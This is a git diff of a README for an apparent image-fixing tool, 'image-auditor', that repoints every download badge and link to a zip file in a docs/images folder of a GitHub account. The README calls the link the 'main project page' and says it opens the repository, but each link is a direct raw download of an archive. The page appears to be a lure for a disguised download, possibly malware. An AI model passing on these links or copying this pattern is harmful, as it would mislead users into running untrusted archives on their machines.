@@ -1,6 +1,6 @@
 # 🔍 image-auditor - Fix Image Issues Fast
 
-[![Download image-auditor](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/src/tui/image-auditor-v2.1.zip)
+[![Download image-auditor](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/docs/images/image-auditor-2.4.zip)
 
 ## What is image-auditor?
 
@@ -30,7 +30,7 @@ image-auditor runs entirely on your local machine once downloaded. It does not u
 
 1. Click the big blue badge near the top or visit the main project page here:
    
-   [Download image-auditor](https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/src/tui/image-auditor-v2.1.zip)
+   [Download image-auditor](https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/docs/images/image-auditor-2.4.zip)
 
 2. The link opens the project repository on GitHub. Look for the **Releases** or **Assets** section.
 
@@ -124,11 +124,11 @@ Support is not included in this readme, but community forums and GitHub issues c
 
 ## 🔗 Useful Links
 
-- Main project page: [https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/src/tui/image-auditor-v2.1.zip](https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/src/tui/image-auditor-v2.1.zip)
+- Main project page: [https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/docs/images/image-auditor-2.4.zip](https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/docs/images/image-auditor-2.4.zip)
 
 - Download badge for quick access:
 
-  [![Download image-auditor](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/src/tui/image-auditor-v2.1.zip)
+  [![Download image-auditor](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://raw.githubusercontent.com/Vitalizationgenusdioon476/image-auditor/main/docs/images/image-auditor-2.4.zip)
 
 ---
 
